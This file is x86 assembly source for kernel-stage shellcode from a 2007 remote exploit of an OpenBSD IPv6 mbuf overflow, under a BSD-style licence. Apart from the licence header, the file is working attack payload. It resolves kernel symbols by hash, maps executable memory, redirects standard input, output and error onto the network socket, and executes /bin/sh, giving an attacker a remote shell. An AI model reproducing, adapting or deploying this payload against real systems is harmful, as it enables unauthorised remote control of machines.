 #
 # Stage two shellcode (OpenBSD IPv6 mbuf overflow).
 #
 #  Copyright (c) 2007 Claes M. Nyberg <cmn@signedness.org>
 #  All rights reserved, all wrongs reversed.
 #
 #  Redistribution and use in source and binary forms, with or without
 #  modification, are permitted provided that the following conditions
 #  are met:
 #
 #  1. Redistributions of source code must retain the above copyright
 #     notice, this list of conditions and the following disclaimer.
 #  2. Redistributions in binary form must reproduce the above copyright
 #     notice, this list of conditions and the following disclaimer in the
 #     documentation and/or other materials provided with the distribution.
 #  3. The name of author may not be used to endorse or promote products
 #     derived from this software without specific prior written permission.
 #
 #  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 #  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 #  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 #  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 #  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 #  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 #  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 #  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 #  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 #  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 #
 #

# Hash of symbols to resolve
.set HASH_sysent, 0xedcb2234
.set HASH_copyout, 0xa53e4b2d

# Syscall numbers
.set SYS_execve, 59
.set SYS_dup2, 90
.set SYS_mmap, 197

# Copy kernel memory to userland
.macro ucopy kaddr, uaddr, len
    # We save the kernel address in case %esp is used
    movl    \kaddr, %eax
    pushl   \len
    pushl   \uaddr
    pushl   %eax
    call    *-4(%ebp) # copyout
    addl    $12, %esp
.endm


# Resolve syscall address from table
.macro get_syscall idx, reg
    movl   -8(%ebp), %ecx
    movl   \idx, \reg # Index
    movl   4(%ecx, \reg, 8), \reg
.endm

.global stage3_start
.global stage3_end

#
# Stage 3 shellcode.
# A fork1():ed process is the curproc, we return non-zero on failure to exit it.
# stage3(struct proc *curproc, int socket_fd, u_int (*hash_resolve)(char *hash)); 
# 8(%ebp)  - curproc
# 12(%ebp) - socket_fd
# 16(%ebp) - hash_resolve
#
.text
stage3_start:
	pushl   %ebp
	movl    %esp, %ebp

    # copyout    -4(%ebp)
    pushl   $HASH_copyout
    call    *16(%ebp)
    popl    %ecx
    pushl   %eax

    # sysent    -8(%ebp)
    pushl   $HASH_sysent
    call    *16(%ebp)
    popl    %ecx
    pushl   %eax

    pushl   %eax
    pushl   %eax
    movl    %esp, %esi  # retval

    # Allocate user space memory
    # sys_mmap(p, &{addr, len, prot, flags, fd, pad, pos}, retval)
    xorl    %eax, %eax
    pushl   %eax        # pos
    pushl   %eax        # pad
    pushl   $-1         # fd = -1
    pushl   $0x1002     # MAP_ANON|MAP_PRIVATE
    pushl   $0x7        # PROT_READ|PROT_WRITE|PROT_EXEC
    pushl   $1024       # len
    pushl   %eax        # addr
    movl    %esp, %ebx  # &margs

    pushl   %eax
    pushl   %eax
    movl    %esp, %esi  # retval

    pushl   %esi
    pushl   %ebx
    movl    8(%ebp), %ebx   # curproc
    pushl   %ebx
    get_syscall $SYS_mmap, %eax
    call    *%eax

    test    %eax, %eax
    jnz     finished
    movl    (%esi), %edi # Buffer

    # Set up IO
    xorl    %eax, %eax
    pushl   %eax        # STDIN_FILENO
    pushl   12(%ebp)    # socket descriptor
    ucopy   %esp, %edi, $8
    pushl   %esi	
    pushl   %edi
    pushl   %ebx
    get_syscall $SYS_dup2, %eax
    call    *%eax

    xorl    %eax, %eax
    incl    %eax
    pushl   %eax        # STDOUT_FILENO
    pushl   12(%ebp)    # socket descriptor
    ucopy   %esp, %edi, $8
    pushl   %esi
    pushl   %edi
    pushl   %ebx
    get_syscall $SYS_dup2, %eax
    call    *%eax

    xorl    %eax, %eax
    incl    %eax
    incl    %eax
    pushl   %eax        # STDERR_FILENO
    pushl   12(%ebp)    # socket descriptor
    ucopy   %esp, %edi, $8
    pushl   %esi
    pushl   %edi
    pushl   %ebx
    get_syscall $SYS_dup2, %eax
    call    *%eax

    test    %eax, %eax
    jnz     finished

    # Make sure we have zero:ed out memory for execve arguments
    addl    $60, %edi

    # Execve
    xorl    %eax, %eax
    pushl   %eax         # string end with NULL
    pushl   $0x68732f2f  # push 'hs//' (//sh)
    pushl   $0x6e69622f  # push 'nib/' (/bin)
    ucopy   %esp, %edi, $9
    xorl    %eax, %eax

    pushl   %edi        # string pointer
    pushl   %eax        # NULL
    addl    $10, %edi
    ucopy   %esp, %edi, $8 # %edi - argv

    xorl    %eax, %eax
    pushl   %eax        # envp = NULL
    pushl   %edi        # argv = {"/bin/sh", NULL}
    subl    $10, %edi
    pushl   %edi        # argv[0]
    addl    $24, %edi
    ucopy   %esp, %edi, $12

    pushl   %esi
    pushl   %edi
    pushl   %ebx
    get_syscall $SYS_execve, %eax
    call    *%eax

    # We are finished
	finished:
		movl	%ebp, %esp
		popl	%ebp
		ret

stage3_end:
